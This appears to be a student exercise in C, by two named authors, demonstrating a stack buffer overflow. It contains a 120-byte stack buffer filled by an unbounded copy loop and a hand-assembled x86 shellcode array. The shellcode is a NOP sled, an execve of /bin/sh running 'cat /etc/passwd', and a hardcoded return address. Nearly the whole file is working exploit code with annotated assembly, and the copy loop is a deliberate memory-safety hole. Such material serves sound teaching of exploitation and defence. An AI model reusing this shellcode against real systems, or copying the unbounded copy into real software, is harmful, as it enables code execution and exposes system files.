// Vasa Shpatov, 15vs32
// Ayrton Foster, 16atf

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void doTest();

int main(int argc, char * argv[]){

    // Call the vulnerable function
    doTest();

    exit(0);
}

char compromise[145] = {

	// Padding
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
	0x90,	//            nop
 
	// Exploit code
	0xEB,	// start:     jmp short codeEnd
	0x29,	
	0x5E,	// start2:    pop esi
	0x31,	//            xor eax,eax
	0xC0,	
	0x88,	//            mov [byte esi+flagStr-exeStr-2],al     ; move one null byte to end of /bin/sh (offset is 2 chars. to replace the second-last "X" instead of last "y")
	0x46,	
	0x07,	
	0x88,	//            mov [byte esi+cmdStr-exeStr-1],al      ; move one null byte to end of -c	
	0x46,	
	0x0B,	
	0x88,	//            mov [byte esi+arrayAddr-exeStr-1],al   ; move one null byte to end of shell command	
	0x46,	
	0x20,	
	0x89,	
	0x46,	
	0x2D,	//            mov [byte esi+arrayAddr-exeStr+12],eax ; move null word to end of array
		
			//            ; Put exeStr into arrayAddr here
	0x89,	//            mov [byte esi+arrayAddr-exeStr],esi
	0x76,	
	0x21,	
		
			//            ; Put flagStr into arrayAddr here
	0x8D,	//            lea edi,[byte esi+flagStr-exeStr]
	0x7E,	
	0x09,	
	0x89,	//            mov [byte esi+arrayAddr-exeStr+4],edi
	0x7E,	
	0x25,	
			
			//            ; Put cmdStr into arrayAddr here
	0x8D,	//            lea edi,[byte esi+cmdStr-exeStr]
	0x7E,	
	0x0C,	
	0x89,	//            mov [byte esi+arrayAddr-exeStr+8],edi
	0x7E,	
	0x29,	
			
	0xB0,	//            mov al,0x0b
	0x0B,	
	0x89,	//            mov ebx,esi
	0xF3,	
	0x8D,	//            lea ecx,[byte esi+arrayAddr-exeStr]
	0x4E,	
	0x21,	
	0x31,	//            xor edx,edx
	0xD2,	
		
	0xCD,	//            int 0x80
	0x80,	
	0xE8,	// codeEnd:   call start2
	0xD2,	
	0xFF,	
	0xFF,	
	0xFF,	
	0x2F,	// exeStr:    db "/bin/shXy" ; "y" is added To avoid 0x0A (newline) as offset
	0x62,	
	0x69,	
	0x6E,	
	0x2F,	
	0x73,	
	0x68,	
	0x58,	
	0x79,	
	0x2D,	// flagStr:   db "-cX"
	0x63,	
	0x58,	
	0x63,	// cmdStr:    db "cat /etc/passwd;exitX"
	0x61,	
	0x74,	
	0x20,	
	0x2F,	
	0x65,	
	0x74,	
	0x63,	
	0x2F,	
	0x70,	
	0x61,	
	0x73,	
	0x73,	
	0x77,	
	0x64,	
	0x3B,	
	0x65,	
	0x78,	
	0x69,	
	0x74,	
	0x58,	
	0xFF,	// arrayAddr: dd 0xffffffff
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	//            dd 0xffffffff
	0xFF,	
	0xFF,	
	0xFF,
	0xFF,	//            dd 0xffffffff
	0xFF,	
	0xFF,	
	0xFF,
	0xFF,	//            dd 0xffffffff
	0xFF,	
	0xFF,	
	0xFF,	
	//0x61,	// newAddr:   dd newAddr-start
     
	// Return address 0xbffff890 - 4 - 61
	0x2B,
	0xf8,
	0xff,
	0xbf,
     
	// NULL
	0x00
	
};

char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "WXYZ";

int i;
void doTest(){
    char buffer[120];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */

    for (i = 0; compromise[i]; i++) {
		buffer[i] = compromise[i];
	}
}

